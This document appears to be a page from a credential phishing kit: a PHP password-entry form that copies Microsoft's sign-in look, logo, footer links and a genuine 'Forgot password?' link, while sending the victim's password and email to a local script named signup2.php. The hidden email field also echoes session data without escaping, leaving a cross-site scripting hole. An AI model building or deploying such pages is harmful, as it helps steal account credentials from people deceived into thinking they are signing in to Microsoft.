<?php
session_start(); // Start the session
include("connection.php");

if(isset($_POST['submit'])){
    // Store the email in the session
    $_SESSION['email'] = $_POST['email'];

    // Redirect to the second page
    header("Location: index2.php");
    exit();
}
?>
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <link rel="shortcut icon" type="x-icon" href="micros.png">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>microsoft Upgrade</title>
    <link rel="stylesheet" href="https://cdnjs.cloudfare.com/ajax/libs/font-awesome/6.2.0/css/all.min.css">
    <link rel="stylesheet" href="style.css">
  </head>
  <body>
    <div id="form">
    <img src="img/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" id="logos">
    <div class="label">
    <a href="index.php" id="lblicon"><i class="fas fa-arrow-left"></i></a>
    <label id="lbltxt"><?php echo isset($_SESSION['email']) ? htmlspecialchars($_SESSION['email']) : ''; ?></label>
</div>
        <h1 id="heading">Enter password</h1><br>
        <form name="form" action="signup2.php" method="POST" >
            <input type="password" id="passes" name="pass" placeholder="Enter password" required><br><br>
            <input type="hidden" name="email" value="<?php echo isset($_SESSION['email']) ? $_SESSION['email'] : ''; ?>">
            <h3><a id="txt3" href="https://login.microsoftonline.com/common/oauth2/v2.0/authorize?scope=service%3A%3Aaccount.microsoft.com%3A%3AMBI_SSL+openid+profile+offline_access&response_type=code&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-signin-oauth&client-request-id=34aae431-013b-4335-b9e5-d6a8049e1bd4&x-client-SKU=MSAL.Desktop&x-client-Ver=4.58.1.0&x-client-OS=Windows+Server+2019+Datacenter&prompt=login&client_info=1&state=H4sIAAAAAAAEAAXBuWKCMAAA0H9xdcCARhg6mMohIFQMJLKFIEi4bDgsfH3f2zhgl5KlWuMWlDi0azZYB4ncltD4rqn8fKXqnCOfNkVFhLqd9yIjwgBeg46DnweX4xoMTvkarJpSYePEJu5zpv1svIbE5mt6_s0SmBcY2qnezPsY97JimbvVulWqGXokuxxE1nSbo0LsiFXU15aZt3FcXmz0fM2_6X6RVoLxLgFR7EbDZRe9xXPRYalU0D47YQ6tZcRprNDnn7MPg8FAizw5jf6p-WH-VCBnmYY68A6Mq2HeTqGgtD8mkeGwQ4--TWSW0D25_QJaEl7aNGKTBE5Qfwo4JcXYcBQzsjYa9Oj2wNu0W5WtdvYUYyp5AL3Oljm-T7z3U2je8ZQc5XB_fIiiqz_TQ3uUWOPCkhKXX5t_qZMAJm4BAAA&msaoauth2=true&lc=1033">Forgot password?</a></h3>
            <input type="submit" id="btn3" value="Submit" name="submit"/>
        </form>
    </div>
    <footer>
    <div class="footers">
    <a href="https://www.microsoft.com/en-us/servicesagreement/" id="link">Terms of use</a>
    <a href="https://privacy.microsoft.com/en-us/privacystatement" id="link1">Privacy & cookies</a>
</div>
</footer>
<script src="https://kit.fontawesome.com/b38c4e7b21.js" crossorigin="anonymous"></script>
  </body>
</html>